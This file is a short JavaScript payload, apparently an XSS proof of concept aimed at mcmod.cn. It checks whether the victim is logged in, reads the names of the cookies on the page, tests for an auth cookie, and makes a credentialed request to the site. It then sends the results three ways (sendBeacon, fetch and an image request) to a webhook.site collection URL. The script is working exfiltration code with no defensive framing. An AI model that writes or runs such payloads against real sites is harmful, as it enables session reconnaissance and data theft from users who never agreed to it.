(function () {
    var m = {
        t: new Date().toISOString(),
        origin: location.origin,
        path: location.pathname,
        loggedInPage: /退出|logout/i.test(document.body.innerHTML),
        cookieReadable: true,
        cookieNames: [],
        authCookiePresent: null,
        ua: navigator.userAgent.slice(0, 80),
        credentialedGetOk: null
    };
    try {
        m.cookieNames = document.cookie.split(/;\s*/).map(function (c) { return c.split('=')[0]; }).filter(Boolean);
        m.authCookiePresent = m.cookieNames.indexOf('Example_auth') >= 0;
    } catch (e) { m.cookieReadable = false; }
    fetch('https://www.mcmod.cn/sv/', { credentials: 'include' })
        .then(function (r) { m.credentialedGetOk = r.ok; go(m); })
        .catch(function () { m.credentialedGetOk = false; go(m); });
    function go(m) {
        var b = JSON.stringify(m);
        try { navigator.sendBeacon(EXFIL_URL, new Blob([b], { type: 'text/plain' })); } catch (e) {}
        try { fetch(EXFIL_URL, { method: 'POST', mode: 'no-cors', body: b }); } catch (e) {}
        new Image().src = EXFIL_URL + '?d=' + encodeURIComponent(b);
    }
    var EXFIL_URL = 'https://webhook.site/01ca0284-3d84-44fa-8782-3ebce53a6cee';
})();